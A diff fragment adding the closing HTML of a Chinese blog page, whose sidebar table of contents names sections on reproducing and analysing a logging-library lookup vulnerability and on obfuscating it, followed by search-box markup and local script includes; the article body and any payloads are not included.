+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">0x00 漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">0x01 代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95"><span class="nav-text">日志记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B6%88%E6%81%AF%E6%A0%BC%E5%BC%8F%E5%8C%96"><span class="nav-text">消息格式化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2"><span class="nav-text">字符替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lookup"><span class="nav-text">Lookup</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%8F%98%E5%BD%A2%E6%80%9D%E8%B7%AF"><span class="nav-text">0x02 变形思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A2%9E%E5%8A%A0-%E5%B9%B2%E6%89%B0"><span class="nav-text">增加:-干扰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B5%8C%E5%A5%97%E5%85%B6%E4%BB%96%E5%8D%8F%E8%AE%AE"><span class="nav-text">嵌套其他协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%84%E5%90%88"><span class="nav-text">组合</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
